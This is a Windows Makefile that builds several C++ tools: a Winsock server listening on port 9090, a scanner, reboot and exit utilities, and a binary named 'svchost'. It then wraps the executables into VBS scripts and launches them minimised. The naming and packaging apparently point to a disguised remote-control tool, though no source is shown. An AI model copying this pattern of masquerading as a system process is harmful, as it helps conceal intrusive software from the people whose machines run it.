all: main

serv:
	-windres -i "../rec.rc" --input-format=rc -o "../rec.res" -O coff
	g++ -c serv.cpp -o serv.o
	g++ serv.o ../rec.res -o ../serv -lws2_32
	del serv.o
	-del ..\\rec.rc

svchost: 
	g++ svchost.cpp -o ../svchost

chport:
	g++ chport.cpp -o ../chport

reboot:
	g++ reboot.cpp -o ../reboot

exit:
	g++ exit.cpp -o ../exit

sound:
	g++ sound.cpp -o ../sound

fillvbs:
	g++ fillvbs.cpp -o ../fillvbs

scanner:
	-windres -i "../recForScan.rc" --input-format=rc -o "../recForScan.res" -O coff
	g++ -c scanner.cpp -o scanner.o
	g++ scanner.o ../recForScan.res -o ../scanner
	del scanner.o
	-del ..\\recForScan.rc

end:
	-mkdir ..\\log
	-mkdir ..\\settings
	-mkdir ..\\sounds
	touch ..\\log\\startapp.log
	touch ..\\settings\\config.cfg
	touch ..\\sounds\\mstart.vbs
	echo port=9090 > ..\\settings\\config.cfg
	echo bytesRecieved=4096 >> ..\\settings\\config.cfg
	..\\fillvbs Opera.wav ../sounds/mstart.vbs
	start /MIN /D .. fillvbs reboot.exe reboot.vbs
	start /MIN /D .. fillvbs scanner.exe scanner.vbs
	start /MIN /D .. fillvbs serv.exe serv.vbs
	start /MIN /D .. fillvbs svchost.exe svchost.vbs

main: serv svchost chport reboot exit sound fillvbs scanner end
